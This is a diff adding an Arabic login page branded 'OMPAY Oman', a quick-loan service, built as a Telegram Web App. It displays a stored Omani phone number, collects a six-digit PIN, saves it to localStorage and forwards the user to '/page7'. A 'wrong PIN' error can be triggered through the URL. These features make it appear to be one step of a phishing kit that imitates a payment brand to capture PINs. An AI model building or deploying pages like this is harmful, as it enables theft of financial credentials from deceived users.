@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>OMPAY عمان - تسجيل الدخول</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --ompay-primary: #004b87;
+            --ompay-hover: #003366;
+            --ompay-blue-light: #0077b6;
+            --bg-color: #ffffff;
+            --text-dark: #1e293b;
+            --text-muted: #64748b;
+            --border-ompay: #004b87;
+            --btn-disabled-bg: #e2e8f0;
+            --btn-disabled-text: #94a3b8;
+        }
+
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; }
+
+        .header-box {
+            width: 100%; background: linear-gradient(180deg, var(--ompay-blue-light) 0%, var(--ompay-primary) 100%);
+            padding: 30px 20px 25px; color: white; text-align: center; border-bottom: 4px solid #003366;
+        }
+        .header-title { font-size: 30px; font-weight: 800; margin: 0; display: flex; justify-content: center; align-items: center; }
+        .header-title .om-part { color: #90e0ef; margin-left: 6px; }
+        .header-title .pay-part { color: #ffffff; }
+        .sub-header-text { font-size: 14px; margin-top: 6px; font-weight: 500; color: #f8fafc; }
+
+        .main-content {
+            width: 90%; max-width: 420px; margin: 25px auto 0; text-align: center; flex-grow: 1;
+            display: flex; flex-direction: column; align-items: center;
+        }
+        h2 { color: #334155; font-size: 22px; margin: 10px 0 25px; font-weight: 600; }
+
+        .phone-display {
+            width: 100%; border: 1.5px solid var(--border-ompay); border-radius: 12px; padding: 14px 16px;
+            display: flex; align-items: center; justify-content: space-between; margin-bottom: 30px;
+            font-size: 18px; font-weight: 700; color: #1e293b; background-color: #f8fafc; direction: ltr;
+        }
+        .flag-icon { font-size: 20px; }
+
+        .pin-label { color: var(--text-muted); margin-bottom: 16px; font-size: 14px; font-weight: 500; }
+        .pin-wrapper { position: relative; width: 100%; display: flex; justify-content: center; align-items: center; margin-bottom: 8px; }
+        
+        /* Adjusted gap and box sizes to fit 6 inputs comfortably */
+        .pin-input-group { display: flex; gap: 8px; direction: ltr; justify-content: center; width: 100%; }
+        .pin-box {
+            width: 44px; height: 50px; border: 1.5px solid var(--border-ompay); border-radius: 10px;
+            text-align: center; font-size: 20px; font-weight: bold; outline: none; background-color: #ffffff;
+            padding: 0;
+        }
+        .toggle-eye { cursor: pointer; font-size: 20px; user-select: none; margin-right: 8px; }
+        .forgot-pin { color: var(--text-muted); font-size: 13px; text-decoration: none; margin-bottom: 35px; display: inline-block; }
+
+        .btn-submit {
+            background-color: var(--btn-disabled-bg); color: var(--btn-disabled-text); border: none; width: 100%;
+            padding: 16px; border-radius: 10px; font-size: 16px; font-weight: 800; cursor: not-allowed; transition: background-color 0.2s;
+        }
+        .btn-submit.active { background-color: var(--ompay-primary); color: #ffffff; cursor: pointer; }
+        .btn-submit.active:hover { background-color: var(--ompay-hover); }
+
+        .error-banner {
+            background-color: #fef2f2; color: #dc2626; border: 1px solid #fecaca; padding: 12px;
+            border-radius: 8px; font-size: 13px; font-weight: 600; margin-bottom: 15px; width: 100%; display: none;
+        }
+
+        .footer-box {
+            width: 100%; background: linear-gradient(180deg, var(--ompay-primary) 0%, var(--ompay-blue-light) 100%);
+            padding: 35px 20px 20px; color: white; text-align: center; border-top-left-radius: 50% 30px;
+            border-top-right-radius: 50% 30px; margin-top: auto;
+        }
+        .terms-text { font-size: 11px; margin-top: 15px; padding: 0 20px; line-height: 1.4; color: #f8fafc; }
+    </style>
+</head>
+<body>
+
+<div class="header-box">
+    <div class="header-title">
+        <span class="pay-part">OM</span><span class="om-part">PAY</span>
+    </div>
+    <div class="sub-header-text">القروض السريعة والمبسطة</div>
+</div>
+
+<div class="main-content">
+    <h2>تسجيل الدخول</h2>
+    <div id="errorDisplay" class="error-banner"></div>
+
+    <div class="phone-display">
+        <span class="flag-icon">🇴🇲</span>
+        <span>+968</span>
+        <span id="displayPhone">--</span>
+    </div>
+
+    <p class="pin-label">أدخل رمز الدخول السري (PIN)</p>
+
+    <div class="pin-wrapper">
+        <div class="pin-input-group">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+        </div>
+        <span class="toggle-eye" id="eyeIcon">👁️</span>
+    </div>
+
+    <a href="#" class="forgot-pin">نسيت رمز الدخول؟</a>
+    <button id="loginBtn" class="btn-submit" disabled>تسجيل الدخول</button>
+</div>
+
+<div class="footer-box">
+    <div class="header-title">
+        <span class="pay-part">OM</span><span class="om-part">PAY</span>
+    </div>
+    <p class="terms-text">باستمرار، أنت توافق على <u>شروط وأحكام الاستخدام</u> الخاصة بـ OMPAY</p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const pinBoxes = document.querySelectorAll('.pin-box');
+    const loginBtn = document.getElementById('loginBtn');
+    const eye = document.getElementById('eyeIcon');
+    const displayPhone = document.getElementById('displayPhone');
+    const errorDisplay = document.getElementById('errorDisplay');
+
+    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "91234567";
+    displayPhone.textContent = savedPhone;
+
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('error') === 'wrongpin') {
+        errorDisplay.innerText = "❌ رمز الدخول غير صحيح، يرجى المحاولة مرة أخرى.";
+        errorDisplay.style.display = "block";
+    }
+
+    pinBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.replace(/\D/g, '');
+            if (box.value && index < pinBoxes.length - 1) pinBoxes[index + 1].focus();
+            checkInputs();
+        });
+        box.addEventListener('keydown', (e) => {
+            if (e.key === "Backspace" && !box.value && index > 0) pinBoxes[index - 1].focus();
+        });
+    });
+
+    function checkInputs() {
+        const filled = [...pinBoxes].every(b => b.value.length === 1);
+        loginBtn.disabled = !filled;
+        loginBtn.classList.toggle('active', filled);
+    }
+
+    eye.addEventListener('click', () => {
+        const isPassword = pinBoxes[0].type === "password";
+        pinBoxes.forEach(b => b.type = isPassword ? "text" : "password");
+    });
+
+    loginBtn.addEventListener('click', () => {
+        if (!loginBtn.classList.contains('active')) return;
+        loginBtn.disabled = true;
+        loginBtn.classList.remove('active');
+
+        let pin = "";
+        pinBoxes.forEach(b => pin += b.value);
+        localStorage.setItem('lastPin', pin);
+        errorDisplay.style.display = "none";
+
+        window.location.href = "/page7";
+    });
+
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+});
+</script>
+</body>
+</html>
